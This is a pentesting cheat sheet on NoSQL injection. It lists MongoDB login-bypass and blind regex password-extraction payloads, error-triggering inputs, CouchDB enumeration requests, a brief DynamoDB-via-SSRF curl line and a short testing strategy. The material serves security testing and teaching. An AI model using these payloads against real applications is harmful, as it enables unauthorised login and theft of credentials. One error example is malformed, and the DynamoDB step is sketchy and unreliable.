# NoSQL Injection: MongoDB, CouchDB, DynamoDB

## MongoDB Injection

### Authentication Bypass
```json
// Login form with JSON body
{"username": "admin", "password": {"$gt": ""}}
// URL-encoded variant
username=admin&password[$gt]=
// Query operator injection
{"username": {"$ne": null}, "password": {"$ne": null}}
{"$where": "this.password == '' || true"}
```

### Operator-Based Data Extraction
```json
// Check if password starts with 'a'
{"username": "admin", "password": {"$regex": "^a"}}
// Boolean-based blind: iterate through characters
{"username": "admin", "password": {"$regex": "^{}"}}
// Use $where for more flexibility
{"$where": "this.password.length == 32"}
{"$where": "this.username == 'admin' && this.password.startsWith('a')"}
```

### NoSQL Error-Based
```json
// Trigger verbose errors
{"$where": "1"}"}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
// Type confusion
{"username": 1, "password": 1}
```

## CouchDB

```http
GET /_all_docs HTTP/1.1
Host: target.com:5984
GET /_users/_all_docs HTTP/1.1
```

## DynamoDB Injection (via SSRF)

DynamoDB injection typically requires SSRF to reach the DynamoDB API endpoint:

```bash
# Via SSRF to DynamoDB API
curl http://dynamodb.<region>.amazonaws.com/ -H "Host: dynamodb.<region>.amazonaws.com"
```

## Detection Strategy

NoSQL injection is context-dependent:
1. JSON API endpoints with MongoDB backend — test `$gt`, `$ne`, `$regex`, `$where`
2. Express.js apps with `qs` library — test `param[$gt]=` in URL-encoded requests
3. SPA with GraphQL — test NoSQL operators in resolver arguments

Use Burp Intruder with a NoSQL-specific payload list against any API endpoint that accepts JSON or URL-encoded parameters.
